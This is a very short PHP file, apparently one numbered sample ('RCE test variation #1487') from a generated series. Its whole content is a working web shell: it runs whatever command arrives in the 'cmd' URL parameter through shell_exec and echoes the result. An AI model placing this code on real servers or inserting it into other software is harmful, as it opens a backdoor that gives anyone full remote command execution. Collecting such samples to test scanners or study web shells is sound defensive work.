<?php
// RCE test variation #1487
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>